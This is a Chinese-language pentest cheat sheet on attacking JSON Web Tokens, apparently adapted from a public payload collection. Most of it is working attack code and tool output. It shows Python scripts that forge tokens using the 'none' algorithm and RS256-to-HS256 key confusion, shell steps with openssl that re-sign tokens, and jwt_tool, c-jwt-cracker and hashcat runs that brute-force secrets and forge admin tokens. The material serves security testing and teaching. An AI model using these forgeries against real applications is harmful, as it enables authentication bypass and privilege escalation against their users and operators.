# JWT - JSON Web Token

> json web token(jwt)是一个开放标准，它定义了一种紧凑的、自包含的方式，用于作为json对象在各方之间安全地传输信息。此信息可以验证和信任，因为它是数字签名的。

## 目录

- [Tools](#tools)
- [JWT Format](#jwt-format)
- [JWT Signature - None algorithm](#jwt-signature---none-algorithm)
- [JWT Signature - RS256 to HS256](#jwt-signature---rs256-to-hs256)
- [Breaking JWT's secret](#breaking-jwts-secret)
    - [JWT Tool](#jwt-tool)
    - [JWT cracker](#jwt-cracker)
    - [Hashcat](#hashcat)
- [References](#references)

## Tools

- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
- [JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)

## JWT Format

JSON Web Token : 

`Base64(Header).Base64(Data).Base64(Signature)`

Example : 

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

将以上jwt分为3个部分:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
```

### Header

默认的签名算法是 "HS256".

"rs256" 用于非对称目的(rsa非对称加密和私钥签名)。

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

### Payload

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

在线JWT编解码: `http://jsonwebtoken.io`

## JWT Signature - None algorithm

jwt支持签名的无算法。这可能是为了调试应用程序而引入的，但这可能会对应用程序的安全性产生严重影响。 

要利用此漏洞，只需解码jwt并更改用于签名的算法。然后你可以提交你的新JWT。

以下代码是对none算法的基本测试。

```python
import jwt
import base64

def b64urlencode(data):
    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')

print b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
    '.' + b64urlencode("{\"data\":\"test\"}") + '.'
```

或者，您可以修改现有的jwt（注意到期时间）

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"
header, payload, signature  = jwt.split('.')

# Replacing the ALGO and the payload username
header  = header.decode('base64').replace('HS256',"none")
payload = (payload+"==").decode('base64').replace('test','admin')

header  = header.encode('base64').strip().replace("=","")
payload = payload.encode('base64').strip().replace("=","")

# 'The algorithm 'none' is not supported'
print( header+"."+payload+".")
```

## JWT Signature - RS256 to HS256

由于攻击者有时可以获取公钥，因此攻击者可以将报头中的算法修改为hs256，然后使用rsa公钥对数据进行签名。

> 算法hs256使用密钥对每条消息进行签名和验证。

> 算法rs256使用私钥对消息进行签名，并使用公钥进行身份验证。 

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

:warning: 如果此段代码报错，并返回错误"jwt.exceptions.invalidkeyerror:The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret."您需要安装以下版本：`pip install pyjwt==0.4.3`。

下面是将rs256 jwt令牌编辑为hs256的步骤 

1. 用以下命令将公钥文件(key.pem)转为hex字符串.

    ```powershell
    $ cat key.pem | xxd -p | tr -d "\\n"
    2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
    ```

2. 通过公钥提供的hex字符串并使用先前编辑的令牌生成hmac签名。

    ```powershell
    $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a

    (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
    ```

3. 将hex字符串转为base64字符串：

    ```powershell
    $ python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
    ```

4. 增加payload

    ```powershell
    [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
    ```

## Breaking JWT's secret

加密/解密jwt字符串：

```python
import jwt
encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256') # encode with 'secret'

encoded = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE"
jwt.decode(encoded, 'Sn1f', algorithms=['HS256']) # decode with 'Sn1f' as the secret key

# result
{u'admin': True, u'sub': u'1234567890', u'name': u'John Doe'}
```

### JWT tool

首先，爆破签名所使用的的秘钥：

```powershell
git clone https://github.com/ticarpi/jwt_tool
python2.7 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI /tmp/wordlist

Token header values:
[+] alg = HS256
[+] typ = JWT

Token payload values:
[+] sub = 1234567890
[+] role = user
[+] iat = 1516239022

File loaded: /tmp/wordlist
Testing 5 passwords...
[+] secret is the CORRECT key!
```

修改想要伪造的部分：

```powershell
Current value of role is: user
Please enter new value and hit ENTER
> admin
[1] sub = 1234567890
[2] role = admin
[3] iat = 1516239022
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
```

最后对修改过的payload重新签名：

```powershell
Token Signing:
[1] Sign token with known key
[2] Strip signature from token vulnerable to CVE-2015-2951
[3] Sign with Public Key bypass vulnerability
[4] Sign token with key file

Please select an option from above (1-4):
> 1

Please enter the known key:
> secret

Please enter the keylength:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

Your new forged token:
[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
```

### JWT cracker

```bash
git clone https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
Secret is "Sn1f"
```

### Hashcat

> Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - [src](twitter.com/hashcat/status/955154646494040065)

```bash
/hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
```

## References

- [Hacking JSON Web Token (JWT) - Hate_401](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
- [WebSec CTF - Authorization Token - JWT Challenge](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
- [Privilege Escalation like a Boss - October 27, 2018 - janijay007](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
- [5 Easy Steps to Understanding JSON Web Token](https://medium.com/vandium-software/5-easy-steps-to-understanding-json-web-tokens-jwt-1164c0adfcec)
- [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog](https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)](https://nandynarwhals.org/hitbgsec2017-pasty/)
- [Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
- [Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq](https://github.com/dwyl/learn-json-web-tokens)
- [Simple JWT hacking - @b1ack_h00d](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
- [Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- [How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
- [HACKING JSON WEB TOKENS, FROM ZERO TO HERO WITHOUT EFFORT - Thu Feb 09 2017 - @pdp](https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
- [Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE](http://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)